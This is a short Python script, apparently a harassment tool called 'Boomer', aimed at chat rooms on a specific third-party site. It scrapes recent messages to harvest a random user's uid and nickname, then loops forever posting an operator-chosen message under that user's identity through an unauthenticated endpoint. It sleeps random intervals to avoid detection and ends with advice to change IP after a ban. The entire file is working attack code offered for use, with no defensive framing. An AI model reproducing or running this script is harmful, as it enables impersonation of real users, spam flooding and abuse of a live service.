# -*- coding: UTF-8 -*-
import json
from os import system
from random import randint
from requests import get
from time import sleep

system("title Boomer")
print("Code by Fuck_WEILEI Team\n")
roomname = str(input("你想要启动轰炸的群组是:"))
print()
word = str(input("你先轰炸的语句是:"))

def do():
    print("\n轰炸中...")
    o = get("https://zhinengjiaju.vip/xczx/gettalks.action?roomid=%s"%(roomname))
    data2 = o.json()['room']['talks']
    number = data2[randint(0,399)]
    data3 = eval(str(number))
    uid = data3['uid']
    name = data3['nickname']
    request_url = "http://zhinengjiaju.vip/xczx/saidwords.action?roomid=%s&uid=%s&words=%s&nickname=%s"%(roomname,uid,word,name)
    print("URL=%s\nUID=%s\nNAME=%s\n"%(request_url,uid,name))
    get(request_url)
    print("Done.")

while True:
    sleeptime = randint(3,20)
    sleep(sleeptime)
    print("离上次轰炸过去了%d秒"%(sleeptime))
    do()

print()
print("程序非正常结束，IP可能被封禁，请更换IP再试\n")
input("回车两次以退出...")
input()